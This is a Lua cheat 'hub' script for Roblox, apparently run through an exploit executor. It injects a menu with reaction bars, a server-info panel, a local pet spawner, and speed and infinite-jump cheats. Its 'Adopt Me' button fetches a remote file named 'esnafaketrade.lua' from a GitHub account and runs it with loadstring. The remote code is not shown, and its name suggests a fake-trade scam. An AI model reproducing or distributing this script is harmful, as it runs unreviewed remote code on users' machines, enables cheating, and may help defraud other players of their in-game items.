-- [[ MEGA HUB V6: FUNCTIONAL FIX ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- 1. CLEANUP OLD UI
if CoreGui:FindFirstChild("MegaHubV6") then CoreGui.MegaHubV6:Destroy() end

local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV6"

-- 2. REACTION BARS (With Close Button)
local BarsFrame = Instance.new("Frame", ScreenGui)
BarsFrame.Size = UDim2.new(0, 400, 0, 100)
BarsFrame.Position = UDim2.new(0.5, -200, 0.75, 0)
BarsFrame.BackgroundTransparency = 1

local function CreateBars()
    local SBar = Instance.new("Frame", BarsFrame)
    SBar.Size = UDim2.new(0, 280, 0, 45)
    SBar.Position = UDim2.new(0.5, -140, 0, 0)
    SBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", SBar)
    local sL = Instance.new("UIListLayout", SBar)
    sL.FillDirection = "Horizontal" sL.HorizontalAlignment = "Center" sL.VerticalAlignment = "Center" sL.Padding = UDim.new(0, 8)
    for _, e in pairs({"👋", "🤔", "🤝", "➕", "➖", "❌"}) do
        local b = Instance.new("TextButton", SBar)
        b.Size = UDim2.new(0, 30, 0, 30) b.Text = e b.BackgroundTransparency = 1
    end

    local EBar = Instance.new("Frame", BarsFrame)
    EBar.Size = UDim2.new(0, 320, 0, 40)
    EBar.Position = UDim2.new(0.5, -160, 0.55, 0)
    EBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", EBar)
    local eL = Instance.new("UIListLayout", EBar)
    eL.FillDirection = "Horizontal" eL.HorizontalAlignment = "Center" eL.VerticalAlignment = "Center" eL.Padding = UDim.new(0, 10)
    for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
        local b = Instance.new("TextButton", EBar)
        b.Size = UDim2.new(0, 28, 0, 28) b.Text = e b.BackgroundTransparency = 1
    end
end
CreateBars()

-- 3. THE HUB MENU
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 500, 0, 360)
Main.Position = UDim2.new(0.5, -250, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.Active = true Main.Draggable = true
Instance.new("UICorner", Main)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, 0)
Side.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Instance.new("UICorner", Side)
Instance.new("UIListLayout", Side).Padding = UDim.new(0, 5)

local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(1, -165, 1, -20)
Content.Position = UDim2.new(0, 155, 0, 10)
Content.BackgroundTransparency = 1
Content.CanvasSize = UDim2.new(0,0,2,0)
Content.ScrollBarThickness = 2
Instance.new("UIListLayout", Content).Padding = UDim.new(0, 10)

local function Clear() for _,v in pairs(Content:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy() end end end

-- TABS
local function ShowDashboard()
    Clear()
    local f = Instance.new("Frame", Content)
    f.Size = UDim2.new(0.95, 0, 0, 80) f.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    Instance.new("UICorner", f)
    local t = Instance.new("TextLabel", f)
    t.Size = UDim2.new(1,-20,1,0) t.Position = UDim2.new(0,10,0,0)
    t.Text = "<b>SERVER INFO</b>\nPlayers: "..#Players:GetPlayers().."\nStatus: Online ✅"
    t.RichText = true t.TextColor3 = Color3.new(1,1,1) t.BackgroundTransparency = 1 t.TextXAlignment = "Left"
end

local function ShowSpawner()
    Clear()
    local i = Instance.new("TextBox", Content)
    i.Size = UDim2.new(0.95, 0, 0, 45) i.PlaceholderText = "Type Pet Name..."
    i.BackgroundColor3 = Color3.fromRGB(40,40,40) i.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", i)

    local sBtn = Instance.new("TextButton", Content)
    sBtn.Size = UDim2.new(0.95, 0, 0, 45) sBtn.Text = "Spawn Pet (Local)"
    sBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200) sBtn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", sBtn)
    sBtn.MouseButton1Click:Connect(function()
        local p = game:GetService("ReplicatedStorage"):FindFirstChild(i.Text, true)
        if p and p:IsA("Model") then
            local c = p:Clone() c.Parent = workspace
            c:MoveTo(LP.Character.HumanoidRootPart.Position + Vector3.new(5,0,0))
        end
    end)
end

local function ShowMisc()
    Clear()
    local function Tool(txt, cb)
        local b = Instance.new("TextButton", Content)
        b.Size = UDim2.new(0.95, 0, 0, 45) b.Text = txt
        b.BackgroundColor3 = Color3.fromRGB(50,50,50) b.TextColor3 = Color3.new(1,1,1)
        Instance.new("UICorner", b) b.MouseButton1Click:Connect(cb)
    end
    Tool("Speed Boost (2x)", function() LP.Character.Humanoid.WalkSpeed = 32 end)
    Tool("Infinite Jump: ON", function() game:GetService("UserInputService").JumpRequest:Connect(function() LP.Character.Humanoid:ChangeState("Jumping") end) end)
    Tool("Toggle Reaction Bars", function() BarsFrame.Visible = not BarsFrame.Visible end)
end

-- SIDEBAR NAV
local function Nav(txt, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 50) b.Text = txt b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(func)
end
Nav("📊 Dashboard", ShowDashboard)
Nav("🐾 Adopt Me", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
Nav("🎁 Spawner", ShowSpawner)
Nav("⚙️ Misc", ShowMisc)

ShowDashboard()
